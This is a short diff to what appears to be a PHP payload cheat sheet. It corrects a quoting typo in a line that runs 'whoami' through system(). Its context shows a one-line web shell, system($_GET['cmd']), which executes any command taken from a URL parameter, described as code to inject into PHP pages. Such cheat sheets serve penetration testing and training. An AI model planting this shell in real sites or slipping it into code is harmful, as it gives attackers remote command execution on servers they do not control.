@@ -14,7 +14,7 @@ This code can be injected into pages that use php.
 ```php
 
 # Execute one command
-<?php system("whoami); ?>
+<?php system("whoami"); ?>
 
 # Take input from the url paramter. shell.php?cmd=whoami
 <?php system($_GET['cmd']); ?>
